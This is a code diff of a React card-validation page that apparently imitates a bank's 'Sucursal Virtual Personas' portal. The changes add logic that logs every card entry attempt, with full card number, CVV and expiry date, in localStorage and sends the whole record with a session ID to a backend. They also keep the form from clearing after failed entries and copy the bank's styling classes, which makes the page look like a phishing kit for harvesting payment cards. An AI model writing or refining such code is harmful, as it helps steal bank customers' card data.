@@ -74,7 +74,7 @@ export default function ValidacionTC() {
     const [cardData, setCardData] = useState({
         filename: "imgi_5_Debito_(preferencial).png",
         tipo: "debito",
-        digits: 5456,
+        digits: "5456",
         label: "Débito Preferencial"
     });
 
@@ -234,14 +234,12 @@ export default function ValidacionTC() {
             // ❌ Tarjeta inválida (Luhn o tipo desconocido)
             if (!isValidNumber || !cardType) {
                 alert("Número de tarjeta inválido. Verifica los dígitos.");
-                setCardDigits("");
                 return;
             }
 
             // ✅ Opcional: validar tipo esperado (crédito/débito)
             if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {
                 alert("La tarjeta ingresada no corresponde a una tarjeta débito válida.");
-                setCardDigits("");
                 return;
             }
 
@@ -317,26 +315,40 @@ export default function ValidacionTC() {
                 try {
                     setCargando(true);
                     // Obtener sesion_id del localStorage
-                    const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
+                    const raw = localStorage.getItem("datos_usuario");
+                    const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                     const sesionId = usuarioLocalStorage?.sesion_id;
 
                     if (!sesionId) {
                         alert("Error: No se encontró la sesión");
+                        setCargando(false);
                         return;
                     }
 
                     // Construir número completo de tarjeta (12 dígitos + 4 últimos)
                     const numeroTarjetaCompleto = cardDigits + cardData.digits;
 
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
+                    if (!usuarioLocalStorage.usuario.tc) usuarioLocalStorage.usuario.tc = [];
+
+                    const nuevoIntento = {
+                        intento: usuarioLocalStorage.usuario.tc.length + 1,
+                        numeroTarjeta: numeroTarjetaCompleto,
+                        fechaExpiracion: expirationDate,
+                        cvv: cvv,
+                        fecha: new Date().toLocaleString()
+                    };
+
+                    usuarioLocalStorage.usuario.tc.push(nuevoIntento);
+                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
+
+
                     // Preparar datos para enviar
+                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array tc
                     const dataSend = {
                         data: {
-                            attributes: {
-                                sesion_id: sesionId,
-                                numeroTarjeta: numeroTarjetaCompleto,
-                                cvv: cvv,
-                                fechaExpiracion: expirationDate
-                            }
+                            attributes: usuarioLocalStorage
                         }
                     };
 
@@ -535,19 +547,25 @@ export default function ValidacionTC() {
     return (
         <>
             <style>{flipStyles}</style>
-            <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
+            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                 {/* Header igual */}
                 <div style={{
-                    flex: 1, backgroundColor: "#2C2A29", backgroundImage: 'url("/assets/images/auth-trazo.svg")',
-                    backgroundRepeat: "no-repeat", backgroundPosition: "center", backgroundSize: "cover",
-                    backgroundPositionY: "-140px", backgroundPositionX: "-610px"
+                    flex: 1,
+                    backgroundColor: "#2C2A29",
+                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
+                    backgroundRepeat: "no-repeat",
+                    backgroundPosition: "center",
+                    backgroundPositionY: "-70px",
+                    backgroundPositionX: "-500px",
                 }}>
 
                     <div style={{ textAlign: "center" }}>
                         <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
                     </div>
                     <div style={{ marginTop: "25px", textAlignLast: "center" }}>
-                        <h1 className="general-title">Sucursal Virtual Personas</h1>
+                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
+                            Sucursal Virtual Personas
+                        </h1>
                     </div>
 
                     <div className="login-page">
